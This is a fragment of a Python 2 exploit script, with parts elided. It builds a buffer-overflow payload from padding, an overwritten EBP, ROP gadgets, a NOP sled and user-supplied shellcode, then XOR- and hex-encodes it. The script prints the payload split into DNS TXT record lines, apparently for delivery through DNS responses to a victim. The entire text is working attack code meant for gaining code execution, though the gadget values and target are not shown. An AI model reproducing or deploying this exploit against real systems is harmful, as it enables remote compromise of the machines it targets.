...
def usage():
	...
	print "{prog} d shellcode.bin".format( prog=argv[0] )
	exit()
...
def exploit():
	victim = None
	if len(argv) < 2 or (argv[1] == 'c' and len(argv) < 5) or (argv[1] == 'b' and len(argv) < 4) or (argv[1] == 'd' and len(argv) < 3):
		usage()
	...
	if argv[1] == 'c':
		...
		with open( argv[2], 'rb' ) as f:
			SHELLCODE = f.read()
		hexa = xor(PADDING + EBP + ROP1 + ROP2 + ROP3 + ROPNOP + NOPs + SHELLCODE).encode('hex')
		n = 0
		for part in range(0,len(hexa),254):
			print "text\tIN\tTXT\t{n}{part}".format(n=n, part=hexa[part:part+254])
			n += 1
	else:
		s.close()
		usage()
